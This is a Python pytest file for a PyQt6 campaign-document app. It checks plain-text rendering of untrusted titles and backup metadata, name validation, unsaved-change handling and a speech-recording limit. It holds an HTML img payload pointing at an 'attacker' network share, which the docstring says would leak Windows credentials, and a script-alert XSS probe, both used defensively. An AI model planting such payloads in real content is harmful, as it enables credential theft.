"""Text that comes from documents, campaigns or backup files is never rendered as HTML.

An <img src="//server/share/x.png"> in a title would make Windows contact that server with the user's credentials.
"""
import pytest

pytest.importorskip("PyQt6")
from PyQt6.QtCore import Qt
from PyQt6.QtWidgets import QApplication, QLabel, QMessageBox

HOSTILE = '<img src="//attacker/share/x.png">'


@pytest.fixture(scope="module")
def app():
    return QApplication.instance() or QApplication([])


@pytest.mark.parametrize("helper", ["show_error", "show_warning", "show_info", "show_question"])
def test_message_boxes_show_plain_text(app, monkeypatch, helper):
    from utils import ui_helpers
    seen = {}

    def fake_exec(self):
        seen["format"] = self.textFormat()
        return QMessageBox.StandardButton.Ok

    monkeypatch.setattr(QMessageBox, "exec", fake_exec)
    getattr(ui_helpers, helper)(None, "t", HOSTILE)
    assert seen["format"] == Qt.TextFormat.PlainText


def test_restore_dialog_labels_from_backup_metadata_are_plain(app, temp_db):
    from gui.dialogs.module_backup_dialogs import RestoreOptionsDialog
    dialog = RestoreOptionsDialog(temp_db, {"module_name": HOSTILE, "backup_date": HOSTILE, "document_count": 3})
    try:
        shown = [label for label in dialog.findChildren(QLabel) if HOSTILE[:20] in label.text()]
        assert shown, "the campaign name label was not found"
        assert all(label.textFormat() == Qt.TextFormat.PlainText for label in shown)
    finally:
        dialog.deleteLater()


def test_titles_with_sql_like_text_are_accepted():
    from utils.text_utils import TextUtils
    assert TextUtils.validate_entity_name("Arrive; update the map")["valid"]
    assert not TextUtils.validate_entity_name("<script>alert(1)</script>")["valid"]


def test_closing_with_unsaved_changes_can_be_cancelled(app, temp_db):
    from PyQt6.QtGui import QCloseEvent
    from gui.dialogs.document_viewer import DocumentViewerWindow
    from models.document import Document

    module_id = temp_db.create_module("C", "d")
    doc_id = temp_db.create_document(module_id, "npc", "Aria", "x")
    viewer = DocumentViewerWindow(Document.from_dict(temp_db.get_document(doc_id)), temp_db)
    try:
        viewer._is_dirty = True
        viewer._ask_save_changes = lambda: "cancel"
        event = QCloseEvent()
        viewer.closeEvent(event)
        assert not event.isAccepted()          # the window stays open, nothing was lost
        viewer._ask_save_changes = lambda: "discard"
        event = QCloseEvent()
        viewer.closeEvent(event)
        assert event.isAccepted()
    finally:
        viewer._is_dirty = False
        viewer.deleteLater()


def test_google_recording_is_limited_to_a_minute(app, temp_db):
    from gui.dialogs.document_viewer import DocumentViewerWindow
    from models.document import Document

    module_id = temp_db.create_module("G", "d")
    doc_id = temp_db.create_document(module_id, "npc", "Aria", "x")
    viewer = DocumentViewerWindow(Document.from_dict(temp_db.get_document(doc_id)), temp_db)
    try:
        viewer.settings.speech_to_text.phrase_limit = 300
        viewer.settings.speech_to_text.provider = "whisper"
        assert viewer._recording_limit_seconds() == 300
        viewer.settings.speech_to_text.provider = "google"
        assert viewer._recording_limit_seconds() == 60
    finally:
        viewer.deleteLater()
